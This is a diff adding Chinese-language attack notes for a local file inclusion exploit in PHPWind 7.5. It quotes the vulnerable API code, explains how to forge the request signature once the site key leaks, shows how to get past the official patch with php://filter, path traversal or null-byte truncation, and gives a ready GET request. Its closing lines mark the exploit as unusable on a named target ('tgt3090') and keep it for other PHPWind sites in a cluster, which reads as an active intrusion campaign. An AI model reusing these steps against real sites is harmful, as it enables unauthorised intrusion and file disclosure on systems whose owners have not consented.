@@ -1,0 +1,61 @@
+### PHPWind 7.5 pw_api.php -> api/class_base.php 本地文件包含（不依赖 register_globals）
+
+# 入口：pw_api.php
+$api = new api_client();
+$response = $api->run($_POST + $_GET);   // 直接吃 $_POST/$_GET
+
+# api/class_base.php : run()
+function run($request) {
+    $request = $this->strips($request);                 // strips() 内部 stripslashes() -> 顺带绕过魔术引号
+    if (isset($request['type']) && $request['type'] == 'uc') {
+        $this->type = 'uc';
+        $this->apikey = $GLOBALS['uc_key'];
+    } else {
+        $this->type = 'app';
+        $this->apikey = $GLOBALS['db_siteownerid'];
+        $this->siteappkey = $GLOBALS['db_siteappkey'];
+    }
+    ksort($request); reset($request);
+    $arg = '';
+    foreach ($request as $key => $value) { if ($value && $key != 'sig') { $arg .= "$key=$value&"; } }
+    if (md5($arg . $this->apikey) != $request['sig']) {     // <== sig 必须自洽
+        return new ErrorMsg(API_SIGN_ERROR, 'Error Sign');
+    }
+    $mode    = $request['mode'];                            // <== 未过滤
+    $method  = $request['method'];
+    $params  = isset($request['params']) ? unserialize($request['params']) : array();
+    return $this->callback($mode, $method, $params);
+}
+
+# api/class_base.php : callback()
+function callback($mode, $method, $params) {
+    if (!isset($this->classdb[$mode])) {
+        if (!file_exists(R_P.'api/class_'.$mode.'.php')) return new ErrorMsg(API_MODE_NOT_EXISTS, "Class($mode) Not Exists");
+        require_once(R_P.'api/class_'.$mode.'.php');        // <== 包含点，$mode 直接拼接
+        $this->classdb[$mode] = new $mode($this);
+    }
+    ...
+}
+
+# 官方补丁（phpwind.net/read-htm-tid-914851.html）
+require_once Pcv(R_P.'api/class_'.$mode.'.php');
+function Pcv($filename,$ifcheck=1){
+    $tmpname = strtolower($filename);
+    $tmparray = array('http://','');
+    $ifcheck && $tmparray[] = '..';
+    if (str_replace($tmparray,'',$tmpname)!=$tmpname) exit('Forbidden');
+    return $filename;
+}
+# 注意补丁只挡了 'http://' 与 '..'（未挡 ftp://、php:// 等），8.7 系用 S::escapePath 拦 '://'、"\0"、'..'
+
+### 利用要点
+# 1) 先确定 apikey：type=uc 时 apikey=$GLOBALS['uc_key']，否则 $GLOBALS['db_siteownerid']
+#    db_siteownerid 是站点 ID，可能在前台页面/JS/接口响应中泄露；uc_key 在老版本常可从 config 泄露。
+# 2) 自己构造 $arg 并算 sig：ksort 后逐项 "$key=$value&"，注意排除 sig 与空值，最后 md5($arg.$apikey)
+# 3) mode 指向已存在文件即可绕过 file_exists 前置，再用 php://filter / 截断 / %00 变形包含本地文件
+#    典型：
+GET /pw_api.php?mode=../../data/bbscache/bank_sort&method=x&type=uc&sig=<自算> HTTP/1.1
+#    （PHP<5.3 可 %00 截断；5.3+ 用路径穿越到已存在的 .php）
+
+### 目标适用性（重要，避免白打）
+# 目标 /bbs/api/ 全目录 404（本版本不集成 UCenter）→ 本链在 tgt3090 上不可用，仅作站群其它 phpwind 7.x 复用。
